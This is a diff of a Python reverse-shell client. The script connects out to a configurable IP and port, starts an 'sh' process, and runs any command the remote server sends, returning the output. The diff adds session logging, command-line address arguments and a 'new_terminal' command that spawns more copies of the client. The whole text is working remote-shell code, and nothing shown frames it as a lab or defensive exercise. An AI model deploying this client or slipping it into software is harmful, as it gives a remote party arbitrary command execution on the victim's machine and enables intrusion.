@@ -1,99 +1,126 @@
 # imports
-import os,socket,subprocess,threading;
+import os, socket, subprocess, threading, logging, sys, platform
 from dotenv import load_dotenv
 
-load_dotenv() # load .env file
+load_dotenv()  # load .env file
 
-ip_address = os.getenv("IP","127.0.0.1") # use local host as fall back.
-port=os.getenv("PORT","5003")# use 5003 as fall back.
+# Get default IP and port from environment variables
+ip_address = os.getenv("IP", "127.0.0.1")
+port = os.getenv("PORT", "5003")
+
+# Allow setting IP and port from command-line arguments
+if len(sys.argv) == 3:
+    ip_address, port = sys.argv[1], sys.argv[2]
+
+server_address = f"{ip_address}:{port}"
+
+# Configure logging (remove 'server' field, log messages manually)
+logging.basicConfig(
+    filename="session.log",
+    level=logging.INFO,
+    format="%(asctime)s - %(message)s",
+    datefmt="%Y-%m-%d %H:%M:%S"
+)
+
+def log_message(message, server_info):
+    """Logs a message with server info."""
+    formatted_message = f"[{server_info}] {message.strip()}"
+    print(formatted_message)  # Print to terminal
+    logging.info(formatted_message)  # Log to file
+
 
 """
-Socket 2 proccess
+Socket to process
 Connects client to the server and reads up to 1024 bytes of data.
 @param socket s
-@param proccss p
+@param process p
 """
-def s2p(s, p):
+def s2p(s, p, server_info):
     while True:
-        # Send the current directory as the prompt
         s.sendall((os.getcwd() + "> ").encode())
-
-        # Receive command
         data = s.recv(1024).decode().strip()
         if not data:
-            continue  # Skip empty input
+            continue
+
+        log_message(f"[COMMAND] {data}", server_info)
 
         if data.lower() == "exit":
-            break  # Exit the loop and close connection
+            msg = "Shutting down the terminal client.\n"
+            s.sendall(msg.encode())
+            log_message(msg, server_info)
+            s.close()  # Close the socket connection
+            sys.exit()  # Exit the script and close the terminal
+            break
 
-        elif data.lower().startswith("cd "):  # Handle directory changes
+        elif data.lower().startswith("cd "):
             try:
-                os.chdir(data[3:])  # Change directory (ignore "cd " with split())
+                os.chdir(data[3:])
             except FileNotFoundError:
-                s.sendall(b"Directory not found.\n")
+                msg = "Directory not found.\n"
+                s.sendall(msg.encode())
+                log_message(msg, server_info)
             except Exception as e:
-                s.sendall(f"Error: {str(e)}\n".encode())
+                msg = f"Error: {str(e)}\n"
+                s.sendall(msg.encode())
+                log_message(msg, server_info)
+        elif data.lower().startswith("new_terminal "):  # Handle new terminal command
+            try:
+                _, new_ip, new_port = data.split() # _ = command, ip = ip, port = port
+                log_message(f"Spawning new terminal: {new_ip}:{new_port}", server_info)
 
-        else:  # Execute the command
-            # Create a new subprocess to execute the command
-            process = subprocess.Popen(
-                data,  # The command to execute (provided by the client)
-                shell=True,  # Run the command through the shell (so you can use shell commands)
-                stdout=subprocess.PIPE,  # Pipe the standard output (stdout) of the process so we can read it
-                stderr=subprocess.PIPE,  # Pipe the standard error (stderr) of the process so we can read it
-                stdin=subprocess.PIPE    # Allow the process to read from its standard input (stdin)
-            )
-
-            # Wait for the process to complete and capture its output and error
+                # Open a new terminal window and run the script with the new IP and port
+                subprocess.Popen(
+                    ["gnome-terminal", "--", "python3", __file__, new_ip, new_port]
+                    if sys.platform.startswith("linux") else
+                    ["cmd.exe", "/c", "start", "python", __file__, new_ip, new_port],
+                    shell=False
+                )
+            except ValueError:
+                msg = "Usage: new_terminal <IP> <PORT>\n"
+                s.sendall(msg.encode())
+                log_message(msg, server_info)            
+        else:
+            process = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             output, error = process.communicate()
-
-            # If there is any standard output (output from the command), send it back to the client
             if output:
                 s.sendall(output)
-
-            # If there is any standard error (error from the command), send it back to the client
+                log_message(output.decode(), server_info)
             if error:
                 s.sendall(error)
-
-
+                log_message(error.decode(), server_info)
 
 """
 Process to socket
 Transfers data from a process's standard output to a socket, sending one byte at a time.
 @param socket s
-@param proccss p
+@param process p
 """
-def p2s(s, p):
+def p2s(s, p, server_info):
     while True:
-        s.send(p.stdout.read(1))
+        output = p.stdout.read(1)
+        if output:
+            s.send(output)
+            log_message(output.decode(), server_info)
 
+# Create a socket and connect to the server
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((ip_address, int(port)))
 
+log_message(f"Connected to server {server_address}", server_address)
 
-# socket with address family internet and make it a TCP socket.
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect((ip_address,int(port))) # connect to server
+# Start the shell process
+p = subprocess.Popen(["sh"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
 
-# Start a new shell process ('sh'), redirecting its stdout and stderr to the same pipe,
-# and allowing interaction via stdin for sending commands.
-p=subprocess.Popen(["sh"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
+# Start communication threads
+s2p_thread = threading.Thread(target=s2p, args=[s, p, server_address])
+s2p_thread.daemon = True
+s2p_thread.start()
 
-# Create and start a new thread to handle the transfer of data from the socket (s) to the process (p)
-# using the s2p function, passing the socket and process as arguments. The thread is set as a daemon 
-# so it will automatically terminate when the main program exits.
-s2p_thread = threading.Thread(target=s2p, args=[s, p])
-s2p_thread.daemon = True  # Set the thread as a daemon (it will exit when the main program exits)
-s2p_thread.start()  # Start the s2p thread
+p2s_thread = threading.Thread(target=p2s, args=[s, p, server_address])
+p2s_thread.daemon = True
+p2s_thread.start()
 
-# Create and start a second thread to handle the transfer of data from the process (p) to the socket (s)
-# using the p2s function, passing the socket and process as arguments. Like the first thread, it's also
-# set as a daemon to ensure it terminates when the main program exits.
-p2s_thread = threading.Thread(target=p2s, args=[s, p])
-p2s_thread.daemon = True  # Set the thread as a daemon
-p2s_thread.start()  # Start the p2s thread
-
-# Wait for the process (p) to finish execution. If a KeyboardInterrupt is raised (e.g., the user presses Ctrl+C),
-# the socket (s) will be closed to clean up resources.
 try:
-    p.wait()  # Wait for the process to finish
-except KeyboardInterrupt:  # Catch keyboard interrupt (Ctrl+C)
-    s.close()  # Close the socket if interrupted
+    p.wait()
+except KeyboardInterrupt:
+    s.close()
